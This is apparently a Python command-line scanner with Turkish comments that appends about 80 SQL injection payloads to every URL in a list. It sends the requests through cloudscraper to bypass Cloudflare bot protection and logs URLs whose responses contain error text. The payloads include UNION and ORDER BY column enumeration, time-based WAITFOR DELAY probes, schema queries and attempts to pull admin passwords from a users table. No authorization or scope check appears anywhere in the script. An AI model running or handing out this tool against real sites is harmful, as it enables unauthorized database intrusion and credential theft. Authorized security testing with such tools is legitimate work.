import argparse
import cloudscraper

def test_sql_injection(url, output_file):
    # SQL Injection testi için farklı payload'lar
    payloads = [
        "'", 
        "?'",
        "';--",
        "')",
        "')--",
        "')#",
        "'))",
        "'+",
        "'||",
        "'`",
        "'\"",
        "';",
        "%22%23",
        "#%22%23",
        "?%22%23",
        "%27%22%2B",
        "%27%22%2B--",
        "';WAITFOR DELAY '0:0:5'--",
        "') WAITFOR DELAY '0:0:5'--",
        "') OR 1=1--",
        "') OR '1'='1",
        "') OR ('1'='1",
        "') OR '1'='1'--",
        "') OR ('1'='1')--",
        "') OR 'a'='a",
        "') AND '1'='1",
        "') AND ('1'='1",
        "') AND '1'='1'--",
        "') AND ('1'='1')--",
        "') AND 'a'='a",
        "') ORDER BY 1--",
        "') ORDER BY 2--",
        "') ORDER BY 3--",
        "') ORDER BY 4--",
        "') ORDER BY 5--",
        "') ORDER BY 6--",
        "') ORDER BY 7--",
        "') ORDER BY 8--",
        "') ORDER BY 9--",
        "') ORDER BY 10--",
        "') ORDER BY 11--",
        "') ORDER BY 12--",
        "') ORDER BY 13--",
        "') ORDER BY 14--",
        "') ORDER BY 15--",
        "') ORDER BY 16--",
        "') ORDER BY 17--",
        "') ORDER BY 18--",
        "') ORDER BY 19--",
        "') ORDER BY 20--",
        "') UNION SELECT NULL--",
        "') UNION SELECT NULL,NULL--",
        "') UNION SELECT NULL,NULL,NULL--",
        "') UNION SELECT NULL,NULL,NULL,NULL--",
        "') UNION SELECT 'a'--",
        "') UNION SELECT 'a','a'--",
        "') UNION SELECT 'a','a','a'--",
        "') UNION SELECT 'a','a','a','a'--",
        "') UNION SELECT 'a',NULL,NULL,NULL--",
        "') UNION SELECT NULL,'a',NULL,NULL--",
        "') UNION SELECT NULL,NULL,'a',NULL--",
        "') UNION SELECT NULL,NULL,NULL,'a'--",
        "') AND (SELECT @@version)--",
        "') AND (SELECT @@hostname)--",
        "') AND (SELECT COUNT(*) FROM information_schema.tables)--",
        "') AND (SELECT COUNT(*) FROM information_schema.columns)--",
        "') AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--",
        "') AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')--",
        "') AND (SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 1)--",
        "') AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1)--",
        "') AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1)--",
        "') AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1)--",
        "') AND (SELECT COUNT(*) FROM users)--",
        "') AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1)--",
        "') AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1)--",
        "') AND (SELECT password FROM users LIMIT 1)--",
        "') AND (SELECT password FROM users WHERE username='admin')--",
        "') AND (SELECT username FROM users WHERE password LIKE '%123%')--"
    ]

    found_vulnerabilities = 0

    scraper = cloudscraper.create_scraper()  # CloudScraper nesnesi oluşturuluyor

    # Payload'ları kullanarak URL'ye istek yapma ve sonuçları kontrol etme
    for payload in payloads:
        # Payload ile URL'yi birleştirme
        payloaded_url = url + payload
        
        # Hedef URL'ye istek gönderme
        response = scraper.get(payloaded_url)

        # Yanıtı kontrol etme
        if "error" in response.text.lower() or "syntax error" in response.text.lower():
            # Potansiyel SQL Injection zafiyeti bulunduğunda dosyaya kaydetme
            with open(output_file, 'a') as outfile:
                outfile.write(f"Potansiyel SQL Injection zafiyeti bulundu: {payloaded_url}\nKullanılan payload: {payload}\n\n")
            found_vulnerabilities += 1

    # SQL Injection zafiyeti bulunamadı
    if found_vulnerabilities == 0:
        with open(output_file, 'a') as outfile:
            outfile.write("SQL Injection zafiyeti bulunamadı.\n\n")
    else:
        with open(output_file, 'a') as outfile:
            outfile.write(f"Toplamda {found_vulnerabilities} adet SQL Injection zafiyeti bulundu.\n\n")

def main():
    # Argümanları işleme
    parser = argparse.ArgumentParser(description="SQL injection zafiyetlerini kontrol eden program")
    parser.add_argument("-L", "--file", type=str, help="Name of txt file containing URLs")
    parser.add_argument("-o", "--output", type=str, help="Name of the file to save the output")
    args = parser.parse_args()

    if args.file:
        if args.output:
            try:
                # Dosyayı açma ve URL'leri okuma
                with open(args.file, 'r') as file:
                    urls = file.readlines()
                    for url in urls:
                        # Her bir URL için SQL Injection testi yapma
                        url = url.strip()  # Satır sonu karakterlerini kaldırma
                        print(f"\n{url}:")
                        test_sql_injection(url, args.output)
                print(f"Çıktılar {args.output} dosyasına kaydedildi.")
            except FileNotFoundError:
                print("Belirtilen dosya bulunamadı!")
        else:
            print("Lütfen bir çıktı dosyası belirtin.")
    else:
        print("Lütfen bir txt dosyası belirtin.")

if __name__ == "__main__":
    main()